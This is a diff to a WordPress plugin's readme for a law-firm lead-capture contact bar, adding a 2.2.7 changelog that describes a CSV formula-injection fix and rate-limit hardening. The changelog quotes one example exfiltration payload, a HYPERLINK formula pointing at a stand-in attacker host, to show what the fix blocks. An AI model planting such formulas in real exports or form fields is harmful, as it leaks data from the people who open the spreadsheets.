@@ -4,7 +4,7 @@ Tags: contact, lead-capture, mobile, law-firm, sticky-bar
 Requires at least: 6.0
 Tested up to: 6.6
 Requires PHP: 8.0
-Stable tag: 2.2.6
+Stable tag: 2.2.7
 License: Proprietary
 
 Mobile-only contact bar with lead capture for BSPE Legal Marketing client sites.
@@ -124,6 +124,23 @@ Run through this list before installing on a new client site:
    "Auto-Update: yes" in the release notes body
 
 == Changelog ==
+
+= 2.2.7 =
+* Security: defang CSV formula injection in the submissions export.
+  Cells beginning with =, +, -, @, TAB, or CR are now prefixed with a
+  leading apostrophe so a hostile name like
+  =HYPERLINK("https://attacker/?leak="&A1,"Click") can no longer fire
+  in Excel / Numbers / Google Sheets when an admin opens the export.
+  The leading quote is invisible in the spreadsheet UI, so cosmetics
+  are unchanged.
+* Hardening: events table DoS protection. New global rate cap of 600
+  events / minute backstops the existing 60/min per-IP limit — engages
+  when REMOTE_ADDR is missing (reverse-proxy misconfig) or when
+  distributed abuse spreads across many IPs. Plus a new daily cron
+  prunes analytics events older than 120 days so the table can't grow
+  indefinitely under sustained traffic. Cron is registered on
+  plugins_loaded (catches PUC updates that skip the activation hook)
+  and cleared on deactivate / uninstall.
 
 = 2.2.6 =
 * Email template rewrite. The notification email a firm receives on
